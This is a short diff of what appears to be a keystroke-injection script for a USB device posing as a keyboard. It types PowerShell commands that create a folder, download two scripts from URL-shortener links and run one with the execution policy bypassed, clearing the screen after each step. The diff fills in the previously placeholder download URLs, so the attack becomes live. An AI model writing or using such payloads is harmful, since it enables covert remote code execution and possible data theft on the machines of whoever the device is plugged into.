@@ -13,9 +13,9 @@ Print:New-Item -ItemType directory -Path C:\quactus\;
 Press:176
 Print:cd C:\quactus\; cls;
 Press:176
-Print:$source = "ADDURLHERE"; $destination = "C:\quactus\run.ps1"; Invoke-WebRequest $source -OutFile $destination; cls;
+Print:$source = "https://goo.gl/XsFHwf"; $destination = "C:\quactus\run.ps1"; Invoke-WebRequest $source -OutFile $destination; cls;
 Press:176
-Print:$source = "ADDURLHERE"; $destination = "C:\quactus\info.ps1"; Invoke-WebRequest $source -OutFile $destination; cls;
+Print:$source = "https://goo.gl/aHtdgE"; $destination = "C:\quactus\info.ps1"; Invoke-WebRequest $source -OutFile $destination; cls;
 Press:176
 Print:PowerShell.exe -ExecutionPolicy Bypass -File run.ps1;
 Press:176
